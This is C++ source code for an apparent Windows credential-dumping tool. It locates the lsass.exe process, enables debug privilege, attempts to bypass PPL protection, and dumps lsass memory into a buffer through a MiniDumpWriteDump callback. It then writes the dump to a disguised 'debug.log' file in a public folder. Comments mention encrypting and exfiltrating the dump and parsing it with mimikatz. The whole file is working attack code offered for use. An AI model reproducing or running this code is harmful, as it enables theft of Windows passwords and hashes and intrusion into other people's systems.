#include<Windows.h>
#include<iostream>
#include<DbgHelp.h>
#include<TlHelp32.h>
#include<processsnapshot.h>
#include<tchar.h>
#include<assert.h>
#include "global.h"
#pragma comment (lib, "Dbghelp.lib")


using namespace std;


// buffer for saving the dump
LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
DWORD bytesRead = 0;

BOOL CALLBACK MiniDumpCallBack(
    _In_	PVOID callBackParam,
    _In_	const PMINIDUMP_CALLBACK_INPUT callBackInput,
    _Inout_	PMINIDUMP_CALLBACK_OUTPUT callBackOutput
)
{
    LPVOID destination = 0, source = 0;
    DWORD bufferSize = 0;

    switch (callBackInput->CallbackType)
    {
    case IoStartCallback:
        callBackOutput->Status = S_FALSE;
        break;
    case IoWriteAllCallback:
        callBackOutput->Status = S_OK;
        source = callBackInput->Io.Buffer;
        destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callBackInput->Io.Offset);

        bufferSize = callBackInput->Io.BufferBytes;
        bytesRead += bufferSize;

        RtlCopyMemory(destination, source, bufferSize);

        //printf("[*] MiniDump offset : 0x%x; length : 0x%x\n", callBackInput->Io.Offset, bufferSize);
        break;

    case IoFinishCallback:
        callBackOutput->Status = S_OK;
        break;
    default:
        return true;
    }
    return true;
}

int main() {


    DWORD lsassPID = 0;
    HANDLE hLsass = NULL;
    LPTSTR name = (LPTSTR)(LPCTSTR)"lsass.exe";
    DWORD bytesWritten = 0;
    ULONG t ;

    // Get lsass PID
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    assert(hSnapshot != INVALID_HANDLE_VALUE);
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    BOOL first = Process32First(hSnapshot, &processEntry);
    while (first)
    {
        if (!_tcscmp(processEntry.szExeFile, name))
        {
            CloseHandle(hSnapshot);
            lsassPID = processEntry.th32ProcessID;
            cout << "[*] Get lsass.exe PID: " << lsassPID << endl;
        }
        first = Process32Next(hSnapshot, &processEntry);
    }
    CloseHandle(hSnapshot);

    //privelege Escalation
    MRtlAdjustPrivilege(20, TRUE, FALSE, &t);

    //bypass PPL protection
    DefineDosDevice(DDD_RAW_TARGET_PATH, _T("LSASS"), _T("\\DEVICE\\LSASS"));

    // open handle to lsass.exe
    hLsass = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, false, lsassPID);

    // set up minidump callback
    MINIDUMP_CALLBACK_INFORMATION callBackInfo;
    ZeroMemory(&callBackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
    callBackInfo.CallbackRoutine = &MiniDumpCallBack;
    callBackInfo.CallbackParam = NULL;

    // dump lsass
    BOOL isDumped = MiniDumpWriteDump(hLsass, lsassPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callBackInfo);


    if (isDumped) {
        printf("\n[*] lsass dumped to memory 0x%p\n", dumpBuffer);
        // At this point, we have the lsass dump in memory at location dumpBuffer - we can do whatever we want with that buffer, i.e encrypt & exfiltrate
        HANDLE outFile = CreateFile((LPCSTR)("C:\\Users\\Public\\Downloads\\debug.log"), GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        //// For testing purposes, let's write lsass dump to disk from our own dumpBuffer and check if mimikatz can work it
        if (WriteFile(outFile, dumpBuffer, bytesRead, &bytesWritten, NULL))
        {
            printf("\n[+] to C:\\Users\\Public\\Downloads\\debug.log\n");
        }
        cout << "[*] lsass dumped successfully" << endl;
    }
}
